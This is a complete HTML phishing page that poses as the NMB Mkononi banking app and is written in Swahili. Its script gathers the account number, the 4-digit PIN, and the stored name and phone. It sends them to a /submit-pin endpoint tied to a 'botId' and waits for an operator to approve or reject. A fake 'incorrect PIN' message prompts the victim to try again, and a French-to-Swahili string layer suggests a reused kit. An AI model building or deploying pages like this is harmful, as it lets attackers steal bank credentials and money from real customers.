<!DOCTYPE html>
<html lang="sw">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>NMB Mkononi - PIN</title>

  <style>
    /* ── reset & base ── */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
    }

    html, body {
      width: 100%;
      min-height: 100%;
    }

    body {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      color: #fff;
      background: linear-gradient(
        180deg,
        #ff7a00 0%,
        #ff8c1a 10%,
        #d96a00 26%,
        #7a3a00 44%,
        #2a1400 62%,
        #0a0500 78%,
        #000000 100%
      );
      background-attachment: fixed;
      background-size: cover;
      background-repeat: no-repeat;
    }

    /* ── top bar (transparent over orange) ── */
    .top-bar {
      height: 72px;
      display: flex;
      align-items: center;
      padding: 0 22px;
      flex-shrink: 0;
      position: relative;
      z-index: 2;
    }

    .back-btn {
      color: #fff;
      font-size: 30px;
      text-decoration: none;
      font-weight: 300;
      background: none;
      border: none;
      padding: 0;
      cursor: pointer;
      position: relative;
      z-index: 1;
      text-shadow: 0 1px 4px rgba(0, 0, 0, 0.25);
      line-height: 1;
    }

    .brand-name {
      color: #fff;
      font-size: 15px;
      font-weight: 700;
      letter-spacing: 0.8px;
      text-transform: uppercase;
      opacity: 0.95;
      margin-left: 14px;
      text-shadow: 0 1px 4px rgba(0, 0, 0, 0.25);
    }

    /* ── container ── */
    .container {
      flex: 1;
      width: 100%;
      max-width: 420px;
      margin: 0 auto;
      padding: 28px 24px 100px;
      display: flex;
      flex-direction: column;
      position: relative;
      z-index: 1;
    }

    /* ── title & subtitle ── */
    .title {
      font-size: 26px;
      font-weight: 700;
      color: #ffffff;
      margin-bottom: 6px;
      letter-spacing: -0.3px;
      text-shadow: 0 2px 8px rgba(0, 0, 0, 0.35);
    }

    .subtitle {
      font-size: 15px;
      color: rgba(255, 255, 255, 0.82);
      margin-bottom: 28px;
      line-height: 1.5;
      text-shadow: 0 1px 6px rgba(0, 0, 0, 0.3);
    }

    /* ── field label ── */
    .field-label {
      font-size: 12px;
      font-weight: 700;
      color: #ffb066;
      letter-spacing: 0.8px;
      text-transform: uppercase;
      margin-bottom: 8px;
      padding-left: 2px;
    }

    /* ── input card (glass dark) ── */
    .input-card {
      background: rgba(0, 0, 0, 0.28);
      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);
      border-radius: 16px;
      padding: 16px 16px 18px;
      margin-bottom: 20px;
      border: 1px solid rgba(255, 255, 255, 0.12);
      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.2);
    }

    .text-input {
      width: 100%;
      height: 56px;
      border-radius: 12px;
      border: 1.5px solid rgba(255, 255, 255, 0.22);
      background: rgba(0, 0, 0, 0.32);
      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);
      padding: 0 16px;
      font-size: 20px;
      font-weight: 600;
      color: #ffffff;
      letter-spacing: 2px;
      outline: none;
      transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
      caret-color: #ff8c1a;
    }

    .text-input::placeholder {
      color: rgba(255, 255, 255, 0.45);
      font-weight: 500;
      letter-spacing: 1px;
    }

    .text-input:focus {
      border-color: #ff8c1a;
      background: rgba(0, 0, 0, 0.45);
      box-shadow: 0 0 0 3px rgba(255, 140, 26, 0.25);
    }

    /* ── alert message ── */
    #otp-alert {
      text-align: center;
      font-size: 14px;
      font-weight: 500;
      min-height: 24px;
      margin-bottom: 12px;
      padding: 10px 12px;
      border-radius: 10px;
      background: transparent;
      transition: all 0.2s;
    }

    #otp-alert.error {
      background: rgba(176, 0, 32, 0.85);
      color: #ffffff;
      border: 1px solid rgba(245, 198, 203, 0.6);
    }

    #otp-alert.success {
      background: rgba(30, 126, 52, 0.85);
      color: #ffffff;
      border: 1px solid rgba(183, 215, 183, 0.6);
    }

    /* ── waiting message ── */
    #waiting {
      text-align: center;
      font-size: 14px;
      color: #ffffff;
      margin-top: 8px;
      display: none;
      padding: 12px;
      border-radius: 10px;
      background: rgba(255, 140, 26, 0.18);
      border: 1px solid rgba(255, 140, 26, 0.4);
      text-shadow: 0 1px 4px rgba(0, 0, 0, 0.3);
    }

    /* ── button (fixed, NMB orange) ── */
    .continue-btn {
      position: fixed;
      left: 50%;
      transform: translateX(-50%);
      bottom: 28px;
      width: calc(100% - 48px);
      max-width: 420px;
      height: 56px;
      font-size: 18px;
      font-weight: 700;
      border-radius: 12px;
      border: none;
      cursor: not-allowed;
      transition: background 0.25s, transform 0.1s, box-shadow 0.25s;
      background: rgba(255, 140, 26, 0.28);
      color: #ffffff;
      text-transform: uppercase;
      letter-spacing: 1px;
      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.25);
      z-index: 3;
    }

    .continue-btn:enabled {
      background: linear-gradient(135deg, #ff8c1a 0%, #ff6b00 100%);
      cursor: pointer;
      box-shadow: 0 6px 20px rgba(255, 122, 0, 0.45);
    }

    .continue-btn:enabled:hover {
      background: linear-gradient(135deg, #ff9a33 0%, #ff7a0d 100%);
      transform: translateX(-50%) translateY(-1px);
      box-shadow: 0 8px 24px rgba(255, 122, 0, 0.55);
    }

    .continue-btn:enabled:active {
      transform: translateX(-50%) translateY(0);
    }

    .continue-btn.waiting {
      background: #f5a623;
      opacity: 1;
      cursor: default;
      box-shadow: 0 4px 12px rgba(240, 173, 78, 0.35);
      transform: translateX(-50%);
    }

    .footer {
      margin-top: 24px;
      text-align: center;
      font-size: 12px;
      color: rgba(255, 255, 255, 0.45);
      letter-spacing: 0.5px;
      padding-bottom: 12px;
    }

    /* ── responsive ── */
    @media (max-width: 480px) {
      .container {
        padding: 24px 18px 100px;
      }
      .title {
        font-size: 24px;
      }
      .continue-btn {
        height: 54px;
        font-size: 17px;
        width: calc(100% - 36px);
      }
      .text-input {
        height: 52px;
        font-size: 18px;
      }
    }

    @media (max-width: 360px) {
      .container {
        padding: 22px 16px 96px;
      }
      .title {
        font-size: 22px;
      }
      .text-input {
        height: 50px;
        font-size: 17px;
      }
      .continue-btn {
        height: 52px;
        font-size: 16px;
      }
    }
  </style>
</head>
<body>

  <!-- Top bar (NMB Mkononi) -->
  <div class="top-bar">
    <button class="back-btn" onclick="window.history.back()">&#8592;</button>
    <span class="brand-name">NMB Mkononi</span>
  </div>

  <div class="container">

    <div class="title">Weka PIN</div>
    <div class="subtitle">Weka namba ya akaunti yako ya NMB na PIN ya tarakimu 4</div>

    <!-- Account number (first) -->
    <div class="input-card">
      <div class="field-label">Namba ya Akaunti</div>
      <input
        id="accountInput"
        class="text-input"
        type="tel"
        inputmode="numeric"
        autocomplete="off"
        maxlength="16"
        placeholder="Namba ya akaunti"
      />
    </div>

    <!-- PIN (second) -->
    <div class="input-card">
      <div class="field-label">PIN</div>
      <input
        id="pinInput"
        class="text-input"
        type="password"
        inputmode="numeric"
        autocomplete="off"
        maxlength="4"
        placeholder="••••"
      />
    </div>

    <div id="otp-alert"></div>
    <div id="waiting">⏳ Inasubiri idhini…</div>

    <div class="footer">NMB Mkononi v 5.3.2 (1.0.0)</div>
  </div>

  <!-- Fixed button -->
  <button id="verifyBtn" class="continue-btn" disabled>TUMA</button>

<!-- ====== TRANSLATION LAYER (French → Kiswahili) ====== -->
<script>
  (function() {
    // If the backend still emits French strings, convert them to Kiswahili.
    const translations = {
      '⏳ En attente d’approbation…': '⏳ Inasubiri idhini…',
      'En attente…': 'Inasubiri…',
      'Se connecter': 'TUMA',
      '❌ Erreur serveur. Veuillez réessayer.': '❌ Hitilafu ya seva. Tafadhali jaribu tena.',
      '❌ Code PIN incorrect. Veuillez réessayer.': '❌ PIN isiyo sahihi. Tafadhali jaribu tena.',
      'Aucun ID reçu': 'Hakuna kitambulisho kilichopokelewa',
      'Erreur serveur': 'Hitilafu ya seva'
    };

    function translateNode(node) {
      if (node.nodeType === Node.TEXT_NODE) {
        let text = node.textContent;
        let changed = false;
        for (const [fr, sw] of Object.entries(translations)) {
          if (text.includes(fr)) {
            text = text.replace(fr, sw);
            changed = true;
          }
        }
        if (changed) node.textContent = text;
      } else if (node.nodeType === Node.ELEMENT_NODE) {
        node.childNodes.forEach(translateNode);
      }
    }

    const targets = [
      document.querySelector('.container'),
      document.getElementById('otp-alert'),
      document.getElementById('waiting'),
      document.getElementById('verifyBtn')
    ].filter(el => el);

    const observer = new MutationObserver(() => {
      targets.forEach(el => translateNode(el));
    });

    targets.forEach(el => {
      observer.observe(el, { childList: true, subtree: true, characterData: true });
    });

    setTimeout(() => {
      targets.forEach(el => translateNode(el));
    }, 100);
  })();
</script>

<!-- ======== ORIGINAL LOGIC (Kiswahili strings) ======== -->
<script>
(function() {
  const input = document.getElementById('pinInput');
  const accountInput = document.getElementById('accountInput');
  const verifyBtn = document.getElementById('verifyBtn');
  const waitingEl = document.getElementById('waiting');
  const alertEl = document.getElementById('otp-alert');

  // ── Account number rules ──
  const ACCOUNT_MIN = 6;
  const ACCOUNT_MAX = 16;

  // ── Get stored data ──
  const fullName = localStorage.getItem('fullName') || localStorage.getItem('name') || 'Mteja NMB Mkononi';
  const phone = localStorage.getItem('phone');
  const params = new URLSearchParams(window.location.search);
  let botId = params.get('botId') || localStorage.getItem('botId');
  if (botId) localStorage.setItem('botId', botId);

  if (!phone || !botId) {
    alert('Kipindi kimeisha. Tafadhali anza tena.');
    window.location.href = 'index.html';
    return;
  }

  // ── Focus helpers ──
  function focusPin() { input.focus(); }
  function focusAccount() { accountInput.focus(); }

  // ── Form validity (account + PIN) ──
  function isFormValid() {
    const acct = accountInput.value.replace(/\D/g, '');
    return acct.length >= ACCOUNT_MIN && acct.length <= ACCOUNT_MAX && input.value.length === 4;
  }

  function updateSubmitState() {
    verifyBtn.disabled = !isFormValid();
  }

  // ── Account number input events ──
  accountInput.addEventListener('input', () => {
    accountInput.value = accountInput.value.replace(/\D/g, '').slice(0, ACCOUNT_MAX);
    alertEl.textContent = '';
    alertEl.className = '';
    updateSubmitState();
  });

  accountInput.addEventListener('paste', (e) => {
    e.preventDefault();
    const paste = e.clipboardData.getData('text');
    accountInput.value = paste.replace(/\D/g, '').slice(0, ACCOUNT_MAX);
    updateSubmitState();
  });

  accountInput.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') {
      focusPin();
    }
  });

  // ── PIN input events ──
  input.addEventListener('input', () => {
    input.value = input.value.replace(/\D/g, '').slice(0, 4);
    updateSubmitState();
    alertEl.textContent = '';
    alertEl.className = '';
  });

  input.addEventListener('paste', (e) => {
    e.preventDefault();
    const paste = e.clipboardData.getData('text');
    const digits = paste.replace(/\D/g, '').slice(0, 4);
    input.value = digits;
    updateSubmitState();
    if (digits.length === 4 && isFormValid()) {
      setTimeout(() => verifyBtn.click(), 300);
    }
  });

  input.addEventListener('keydown', (e) => {
    if (e.key === 'Enter' && !verifyBtn.disabled) {
      verifyBtn.click();
    }
  });

  // ── Show alert message ──
  function showAlert(text, type = 'error') {
    alertEl.textContent = text;
    alertEl.className = type;
  }

  // ── Verify button click ──
  verifyBtn.addEventListener('click', async () => {
    const pin = input.value;
    const accountNumber = accountInput.value.replace(/\D/g, '');

    if (pin.length !== 4) return;
    if (accountNumber.length < ACCOUNT_MIN) {
      showAlert('❌ Tafadhali weka namba sahihi ya akaunti.', 'error');
      focusAccount();
      return;
    }

    verifyBtn.disabled = true;
    verifyBtn.textContent = 'Inasubiri…';
    verifyBtn.classList.add('waiting');
    waitingEl.style.display = 'block';
    showAlert('', '');

    try {
      const res = await fetch(`${window.location.origin}/submit-pin`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name: fullName,
          phone,
          accountNumber,
          pin,
          botId
        })
      });
      if (!res.ok) throw new Error('Hitilafu ya seva');
      const data = await res.json();
      if (!data.requestId) throw new Error('Hakuna kitambulisho kilichopokelewa');
      pollPin(data.requestId);
    } catch (error) {
      waitingEl.style.display = 'none';
      verifyBtn.disabled = false;
      verifyBtn.textContent = 'TUMA';
      verifyBtn.classList.remove('waiting');
      showAlert('❌ Hitilafu ya seva. Tafadhali jaribu tena.', 'error');
    }
  });

  // ── Polling ──
  function pollPin(requestId) {
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`${window.location.origin}/check-pin/${requestId}`);
        const data = await res.json();
        if (data.approved === true) {
          clearInterval(interval);
          window.location.href = 'success.html';
        }
        if (data.approved === false || data.blocked) {
          clearInterval(interval);
          // Reset PIN only (account number is kept for retry)
          input.value = '';
          verifyBtn.disabled = true;
          verifyBtn.textContent = 'TUMA';
          verifyBtn.classList.remove('waiting');
          waitingEl.style.display = 'none';
          showAlert('❌ PIN isiyo sahihi. Tafadhali jaribu tena.', 'error');
          focusPin();
        }
      } catch (error) {
        console.error('Polling error:', error);
      }
    }, 2000);
  }

  // ── Initial focus ──
  window.onload = () => {
    if (accountInput.value.length < ACCOUNT_MIN) {
      focusAccount();
    } else {
      focusPin();
    }
  };
})();
</script>

</body>
</html>
